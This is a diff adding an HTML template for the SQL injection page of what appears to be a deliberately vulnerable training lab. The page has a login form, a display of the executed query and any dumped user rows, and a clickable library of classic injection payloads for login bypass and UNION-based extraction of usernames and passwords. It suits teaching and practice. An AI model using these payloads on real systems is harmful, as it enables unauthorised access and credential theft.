@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>SQL Injection</title>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;600&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="/static/style.css">
+</head>
+
+<body>
+
+    <!-- NAV -->
+    <div class="nav">
+        <div class="nav-brand" onclick="location.href='/vuln/'" style="cursor:pointer;">
+            <div class="nav-brand-dot"></div>
+            Vulnerability Lab
+        </div>
+    </div>
+
+    <!-- PAGE -->
+    <div class="test-page">
+
+        <!-- LEFT -->
+        <div class="col">
+
+            <!-- FORM -->
+            <form method="POST" id="loginForm" class="panel">
+                <div class="panel-header">Login Form</div>
+                <div class="panel-body">
+                    <input id="username" class="input" name="username" placeholder="Username"><br><br>
+                    <input id="password" class="input" name="password" placeholder="Password"><br><br>
+                    <button class="btn btn-primary">Login</button>
+                </div>
+            </form>
+
+            <!-- QUERY -->
+            {% if query_shown %}
+            <div class="panel">
+                <div class="panel-header">Executed Query</div>
+                <div class="panel-body">
+                    <code>{{ query_shown }}</code>
+                </div>
+            </div>
+            {% endif %}
+
+            <!-- RESULT -->
+            {% if result %}
+            <div class="panel">
+                <div class="panel-header">Result</div>
+                <div class="panel-body">
+                    <p><b>Status:</b> {{ result.status }}</p>
+                    <p>{{ result.message }}</p>
+
+                    {% if result.rows %}
+                    <table border="1" style="width:100%; font-size:12px;">
+                        <tr>
+                            <th>ID</th>
+                            <th>User</th>
+                            <th>Password</th>
+                            <th>Role</th>
+                        </tr>
+                        {% for row in result.rows %}
+                        <tr>
+                            <td>{{ row['id'] }}</td>
+                            <td>{{ row['username'] }}</td>
+                            <td>{{ row['password'] }}</td>
+                            <td>{{ row['role'] }}</td>
+                        </tr>
+                        {% endfor %}
+                    </table>
+                    {% endif %}
+                </div>
+            </div>
+            {% endif %}
+
+        </div>
+
+        <!-- RIGHT -->
+        <div class="col">
+
+            <!-- PAYLOADS -->
+            <div class="panel">
+                <div class="panel-header">🔥 Payload Library</div>
+                <div class="panel-body">
+
+                    <div class="payload" onclick="attack(`' OR 1=1 --`)">
+                        ' OR 1=1 -- (Bypass login)
+                    </div>
+
+                    <div class="payload" onclick="attack(`admin'--`)">
+                        admin'-- (Ignore password)
+                    </div>
+
+                    <div class="payload" onclick="attack(`admin' OR '1'='1`)">
+                        admin' OR '1'='1
+                    </div>
+
+                    <div class="payload"
+                        onclick="attack(`' UNION SELECT id,username,password,role,email FROM users--`)">
+                        UNION dump users
+                    </div>
+
+                    <div class="payload" onclick="attack(`' OR role='admin'--`)">
+                        Extract admin
+                    </div>
+
+                </div>
+            </div>
+
+            <!-- SAMPLE CREDS -->
+            <div class="panel">
+                <div class="panel-header">Sample Credentials</div>
+                <div class="panel-body">
+                    <p>admin / supersecret123</p>
+                    <p>alice / password123</p>
+                    <p>bob / letmein</p>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- JS -->
+    <script>
+        function attack(payload) {
+            document.getElementById('username').value = payload;
+            document.getElementById('password').value = 'x';
+            document.getElementById('loginForm').submit();
+        }
+    </script>
+
+</body>
+
+</html>
